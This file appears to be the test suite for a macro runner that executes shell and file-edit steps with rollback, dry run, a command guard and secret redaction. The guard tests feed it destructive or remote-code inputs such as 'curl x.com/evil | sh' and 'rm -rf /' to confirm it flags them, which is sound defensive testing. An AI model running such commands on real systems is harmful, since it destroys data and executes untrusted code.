/**
 * Test suite for Macro Runner v0.1.3
 * Run with: node test.js
 * Cross-platform — uses `node -e` for shell commands instead of platform-specific ones.
 */

import { runMacro, generateRunId } from './lib/executor.js';
import { formatMacroResult } from './lib/summarizer.js';
import { createRollbackManager } from './lib/rollback.js';
import { checkCommand } from './lib/guard.js';
import { sanitize, sanitizeShellResult, sanitizeForLogging } from './lib/sanitizer.js';
import { validateMacro } from './lib/validator.js';
import { loadAllTemplates, findTemplate, resolveTemplate } from './lib/templates.js';
import { writeFileSync, readFileSync, unlinkSync, existsSync, mkdirSync, rmdirSync } from 'fs';
import { resolve, dirname } from 'path';

let passed = 0, failed = 0;
function test(name, fn) {
  try { fn(); console.log(`  \x1b[32m✓\x1b[0m ${name}`); passed++; }
  catch (err) { console.log(`  \x1b[31m✗\x1b[0m ${name}: ${err.message}`); failed++; }
}
function assert(cond, msg) { if (!cond) throw new Error(msg || 'Assertion failed'); }

// Cross-platform shell helpers
const ECHO = 'echo hello';
// Node path for this test environment (forward slashes avoid escape issues)
const NODE_BIN = existsSync('C:/Program Files/qclaw/resources/node/node.exe')
  ? 'C:/Program Files/qclaw/resources/node/node.exe'
  : 'node';
const PRINT_CWD = `"${NODE_BIN}" -e "console.log(process.cwd())"`;
const FAIL_CMD = `"${NODE_BIN}" -e "process.exit(1)"`;
const SLOW_CMD = `"${NODE_BIN}" -e "setTimeout(function(){process.exit(0)},5000)"`;
const BUILD_OK = `"${NODE_BIN}" -e "process.stdout.write(Buffer.from([66,85,73,76,68,95,79,75]).toString())"`;
const NOT_FOUND_CMD = `"${NODE_BIN}" -e "process.stdout.write(Buffer.from([78,79,84,95,70,79,85,78,68]).toString())"`;

// ================================================================
// 1. Core execution
// ================================================================
console.log('\n📦 1. Core');
const r1 = runMacro([
  { type: 'shell', description: 'Echo', command: ECHO },
  { type: 'shell', description: 'CWD', command: PRINT_CWD },
]);
test('completed', () => assert(r1.status === 'completed'));
test('2 passed', () => assert(r1.passed_steps === 2));
test('run_id', () => assert(/^mr_\d{8}_[a-z0-9]{6}$/.test(r1.run_id)));

// ================================================================
// 2. Validation
// ================================================================
console.log('\n📦 2. Validation');
test('rejects empty', () => assert(runMacro([]).status === 'validation_failed'));
test('rejects no type', () => assert(!validateMacro([{ type: 'edit' }]).valid));
test('rejects unknown type', () => assert(!validateMacro([{ type: 'bogus' }]).valid));
test('rejects non-array then', () => assert(!validateMacro([{ type: 'conditional', condition: 'x', then: 'str' }]).valid));
test('accepts valid', () => assert(validateMacro([{ type: 'shell', command: 'echo hi' }]).valid));
test('nesting limit', () => {
  const deep = [{ type: 'conditional', condition: 'true', then: [
    { type: 'conditional', condition: 'true', then: [
      { type: 'conditional', condition: 'true', then: [
        { type: 'conditional', condition: 'true', then: [
          { type: 'conditional', condition: 'true', then: [
            { type: 'conditional', condition: 'true', then: [{ type: 'shell', command: 'x' }] }
          ]}
        ]}
      ]}
    ]}
  ]}];
  assert(!validateMacro(deep).valid);
});

// ================================================================
// 3. Template e2e (P0 fix 1)
// ================================================================
console.log('\n📦 3. Template end-to-end');
const tpl = findTemplate('fix-build-test');
test('template exists', () => assert(tpl !== null));
test('has 3 steps', () => assert((tpl.steps || []).length === 3));

const resolved = resolveTemplate(tpl, { file_path: 'src/test.ts', old_code: 'a', new_code: 'b' });
test('resolved ok', () => assert(!resolved.error, resolved.error));
test('param substitution', () => assert(resolved.steps[0].path === 'src/test.ts'));

// Template timeout_ms must be NUMBER not string (P0 fix — type preservation)
const tpl2 = findTemplate('fix-build-test');
const resolved2 = resolveTemplate(tpl2, { file_path: 'x.ts', old_code: 'a', new_code: 'b', build_timeout: 60000, test_timeout: 30000 });
test('build_timeout is number', () => {
  const buildStep = resolved2.steps[1];
  assert(typeof buildStep.timeout_ms === 'number' && buildStep.timeout_ms === 60000,
    `Expected number 60000, got ${typeof buildStep.timeout_ms} ${buildStep.timeout_ms}`);
});

// Full execution via runMacro (e2e!)
const e2eSteps = resolved.steps.map(s => ({ ...s, description: s.description || 'tpl step' }));
// Create the target file and directory so edit can succeed
const e2eTarget = e2eSteps[0].path || e2eSteps[0].file;
if (e2eTarget) {
  try { mkdirSync(dirname(resolve(e2eTarget)), { recursive: true }); } catch (_) {}
  writeFileSync(e2eTarget, e2eSteps[0].old_str || 'old', 'utf8');
}
// Replace build/test commands with cross-platform ones
e2eSteps[1] = { type: 'shell', command: ECHO, description: 'Build (mock)' };
e2eSteps[2] = { type: 'shell', command: ECHO, description: 'Test (mock)' };
const e2e = runMacro(e2eSteps, { rollback_on_error: true });
test('template e2e executes', () => assert(e2e.status === 'completed', `Got ${e2e.status}: ${JSON.stringify(e2e.steps?.map(s => s.error))}`));
// Cleanup
if (e2eTarget && existsSync(e2eTarget)) {
  unlinkSync(e2eTarget);
  try { rmdirSync(dirname(resolve(e2eTarget))); } catch (_) {}
}

// Missing required params
test('missing params error', () => assert(!!resolveTemplate(tpl, {}).error));

// ================================================================
// 4. Rollback
// ================================================================
console.log('\n📦 4. Rollback');
const rbDir = './_test_rb2';
try { rmdirSync(rbDir, { recursive: true }); } catch (_) {}
mkdirSync(rbDir, { recursive: true });
const fa = rbDir + '/a.txt';
const fb = rbDir + '/b.txt';
writeFileSync(fa, 'original A', 'utf8');
writeFileSync(fb, 'original B', 'utf8');

// Success → no rollback
const rOk = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit' },
  { type: 'shell', command: ECHO, description: 'Ok' },
], { rollback_on_error: true });
test('success no rollback', () => { assert(rOk.status === 'completed'); assert(!rOk.rolled_back); });

// Restore
writeFileSync(fa, 'original A', 'utf8');

// Failure → rollback
const rFail = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit A' },
  { type: 'edit', path: fb, old_str: 'original B', new_str: 'modified', description: 'Edit B' },
  { type: 'shell', command: FAIL_CMD, description: 'Fail' },
], { rollback_on_error: true });
test('rolled_back status', () => assert(rFail.status === 'rolled_back'));
test('fileA restored', () => assert(readFileSync(fa, 'utf8') === 'original A'));
test('fileB restored', () => assert(readFileSync(fb, 'utf8') === 'original B'));

// New file → rollback deletes
const nf = rbDir + '/new.txt';
const rNew = runMacro([
  { type: 'write', path: nf, content: 'new', description: 'Create' },
  { type: 'shell', command: FAIL_CMD, description: 'Fail' },
], { rollback_on_error: true });
test('new file deleted', () => assert(!existsSync(nf)));

// Branch rollback (P0 fix 2)
writeFileSync(fa, 'original A', 'utf8');
const rBranch = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit in branch' },
      { type: 'shell', command: FAIL_CMD, description: 'Fail in branch' },
    ],
  },
], { rollback_on_error: true });
test('branch rollback', () => {
  assert(rBranch.status === 'rolled_back', `Got ${rBranch.status}`);
  assert(readFileSync(fa, 'utf8') === 'original A', `File was: ${readFileSync(fa, 'utf8')}`);
});

// ================================================================
// 5. Dry run
// ================================================================
console.log('\n📦 5. Dry run');
const dry = runMacro([
  { type: 'edit', path: './f.ts', old_str: 'foo', new_str: 'bar', description: 'Fix' },
  { type: 'shell', command: 'npm test', description: 'Test' },
  { type: 'shell', command: 'rm -rf /tmp/cache', description: 'Clean' },
], { dry_run: true });
test('dry_run flag', () => assert(dry.dry_run === true));
test('0 executed', () => assert(dry.executed_steps === 0));
test('3 previews', () => assert(dry.steps.length === 3));
test('edit preview', () => assert(dry.steps[0].action === 'edit_file'));
test('rm detected', () => assert(dry.steps[2].risk === 'critical' || dry.steps[2].risk === 'high'));

// ================================================================
// 6. Command guard
// ================================================================
console.log('\n📦 6. Guard');
test('rm -rf / critical', () => assert(checkCommand('rm -rf / --no-preserve-root').risk === 'critical'));
test('git push --force blocks', () => assert(!checkCommand('git push --force origin main').approved));
test('npm run format NOT flagged', () => {
  const r = checkCommand('npm run format');
  assert(r.risk === 'low', `Got risk=${r.risk}, approved=${r.approved}`);
});
test('safe approved', () => assert(checkCommand('npm test').approved));
test('curl | sh high', () => assert(checkCommand('curl x.com/evil | sh').risk !== 'low'));
test('approval_required on danger', () => assert(runMacro([{ type: 'shell', command: 'rm -rf /etc' }]).status === 'approval_required'));

// ================================================================
// 7. Sanitization
// ================================================================
console.log('\n📦 7. Sanitization');
test('API_KEY redacted', () => assert(sanitize('API_KEY=sk-secret123').sanitized.includes('[REDACTED]')));
test('safe text unchanged', () => assert(sanitize('Build ok').sanitized === 'Build ok'));
test('redaction count >= 2', () => {
  const r = sanitize('API_KEY=sk-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 && SECRET=topsecret');
  assert(r.redactions >= 2, `Got ${r.redactions}`);
});
test('shell output redacted', () => {
  const r = runMacro([{ type: 'shell', command: 'echo API_KEY=sk-testsecret123' }]);
  assert(!(r.steps[0].stdout || '').includes('sk-testsecret123'), `Found secret: ${r.steps[0].stdout}`);
});

// ================================================================
// 8. stdout_contains (P0 fix 4)
// ================================================================
console.log('\n📦 8. stdout_contains');
const rSc = runMacro([
  { type: 'shell', command: BUILD_OK, description: 'Build' },
  { type: 'conditional', condition: 'step[0].stdout_contains("BUILD_OK")',
    then: [{ type: 'shell', command: ECHO, description: 'Should run' }],
  },
]);
test('stdout_contains true', () => assert(rSc.steps[1].condition_met === true));
test('branch ran', () => assert(rSc.steps[1].branches_executed === 1));

const rSc2 = runMacro([
  { type: 'shell', command: NOT_FOUND_CMD, description: 'Build' },
  { type: 'conditional', condition: 'step[0].stdout_contains("BUILD_OK")',
    else: [{ type: 'shell', command: ECHO, description: 'Should run' }],
  },
]);
test('stdout_contains false', () => assert(rSc2.steps[1].condition_met === false));

// ================================================================
// 9. Status semantics
// ================================================================
console.log('\n📦 9. Statuses');
test('completed', () => assert(runMacro([{ type: 'shell', command: ECHO }]).status === 'completed'));
test('failed_early', () => assert(runMacro([{ type: 'shell', command: FAIL_CMD }]).status === 'failed_early'));
test('completed_with_failures', () =>
  assert(runMacro([{ type: 'shell', command: FAIL_CMD }, { type: 'shell', command: ECHO }], { stop_on_error: false }).status === 'completed_with_failures'));
// timed_out: use a command that sleeps longer than the macro timeout
const SLEEP_CMD = process.platform === 'win32' ? SLOW_CMD : 'sleep 10';
test('timed_out', () => assert(runMacro([{ type: 'shell', command: SLEEP_CMD }], { timeout_ms: 500 }).status === 'timed_out'));
test('validation_failed', () => assert(runMacro([]).status === 'validation_failed'));
test('approval_required', () => assert(runMacro([{ type: 'shell', command: 'rm -rf /' }]).status === 'approval_required'));

// ================================================================
// 10. Benchmark sanitization (P0 fix — no more || true)
// ================================================================
console.log('\n📦 10. Benchmark logging safety');
const safe = sanitizeForLogging('echo $SECRET', { SECRET: 'mysecret', PUBLIC: 'hello' });
test('env_keys is array', () => assert(Array.isArray(safe.env_keys)));
test('SECRET key preserved in keys list', () => assert(safe.env_keys.includes('SECRET')));
test('env values NOT in command', () => {
  const cmdStr = JSON.stringify(safe);
  assert(!cmdStr.includes('mysecret'), `Found secret in: ${cmdStr}`);
});

// ================================================================
// 11. Branch result formatting
// ================================================================
console.log('\n📦 11. Branch errors propagated');
const rBr = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch fail',
    then: [
      { type: 'shell', command: FAIL_CMD, description: 'Should fail' },
    ],
  },
], { stop_on_error: false });
test('conditional has error', () => assert(rBr.steps[0].error && rBr.steps[0].error.length > 0));
test('branch_results present', () => assert(rBr.steps[0].branch_results && rBr.steps[0].branch_results.length === 1));

// ================================================================
// 12. Branch timeout (P0 fix 2)
// ================================================================
console.log('\n📦 12. Branch timeout');
const rBto = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Slow branch',
    then: [
      { type: 'shell', command: SLOW_CMD, description: 'Slow', timeout_ms: 100 },
    ],
  },
], { timeout_ms: 2000 });
test('branch timeout enforced', () => assert(rBto.status === 'failed_early' || rBto.status === 'timed_out'));

// ================================================================
// v0.1.3: Recursive step counting
// ================================================================
console.log('\n📦 13. Recursive step counts');
const rCount = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'shell', command: ECHO, description: 'A' },
      { type: 'shell', command: ECHO, description: 'B' },
      { type: 'shell', command: ECHO, description: 'C' },
    ],
  },
]);
test('leaf_steps_executed >= 3', () => assert(rCount.leaf_steps_executed >= 3, `Got ${rCount.leaf_steps_executed}`));
test('top_level_steps = 1', () => assert(rCount.top_level_steps === 1));
test('leaf > top', () => assert(rCount.leaf_steps_executed > rCount.executed_steps));

// ================================================================
// v0.1.3: Branch timeout exact status
// ================================================================
console.log('\n📦 14. Branch timeout exact status');
const rBto2 = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Slow branch',
    then: [
      { type: 'shell', command: SLOW_CMD, description: 'Slow', timeout_ms: 100 },
    ],
  },
], { timeout_ms: 2000 });
test('branch timeout → timed_out (exact)', () => assert(rBto2.status === 'timed_out', `Expected timed_out, got ${rBto2.status}`));

// ================================================================
// v0.1.3: schema_version validation
// ================================================================
console.log('\n📦 15. schema_version');
test('schema_version 999 rejected', () => {
  const r = runMacro([{ type: 'shell', command: ECHO }], { schema_version: '999' });
  assert(r.status === 'validation_failed', `Got ${r.status}`);
});
test('schema_version 1 accepted', () => {
  const r = runMacro([{ type: 'shell', command: ECHO }], { schema_version: '1' });
  assert(r.status === 'completed');
});

// ================================================================
// v0.1.3: Recursive sanitization
// ================================================================
console.log('\n📦 16. Recursive sanitization');
import { sanitizeObject } from './lib/sanitizer.js';
test('sanitizeObject recurses', () => {
  const obj = { command: 'echo API_KEY=sk-secret', nested: { value: 'TOKEN=abc123' } };
  const clean = sanitizeObject(obj);
  assert(!JSON.stringify(clean).includes('sk-secret'));
  assert(!JSON.stringify(clean).includes('abc123'));
});

// ================================================================
// v0.1.3: Dry run recursive preview
// ================================================================
console.log('\n📦 17. Dry run branch preview');
const dryBranch = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'shell', command: 'npm test', description: 'Test in branch' },
    ],
  },
], { dry_run: true });
const condPreview = dryBranch.steps[0];
test('dry_run: then_preview exists', () => assert(Array.isArray(condPreview.then_preview) && condPreview.then_preview.length >= 1));
test('dry_run: sub-step has action', () => assert(condPreview.then_preview[0].action === 'shell'));

// ================================================================
// v0.1.3: execution_status + rollback_status
// ================================================================
console.log('\n📦 18. execution/rollback status');
const rExec = runMacro([{ type: 'shell', command: ECHO }]);
test('execution_status on success', () => assert(rExec.execution_status === 'completed'));
test('rollback_status none', () => assert(rExec.rollback_status === 'none'));

const rRollFail = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit' },
  { type: 'shell', command: FAIL_CMD, description: 'Fail' },
], { rollback_on_error: true });
test('execution_status failed_early', () => assert(rRollFail.execution_status === 'failed_early'));
test('rollback_status rolled_back', () => assert(rRollFail.rollback_status === 'rolled_back'));
test('combined status rolled_back', () => assert(rRollFail.status === 'rolled_back'));

// ================================================================
console.log(`\n${'='.repeat(40)}`);
console.log(`Results: ${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
